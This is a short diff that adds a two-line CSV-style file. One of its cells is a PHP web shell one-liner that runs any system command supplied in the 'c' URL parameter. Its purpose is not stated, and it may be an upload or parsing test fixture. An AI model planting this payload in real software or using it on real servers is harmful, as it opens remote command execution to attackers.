@@ -1,0 +1,2 @@
+a,b
+<?php system($_GET['c']); ?>,1
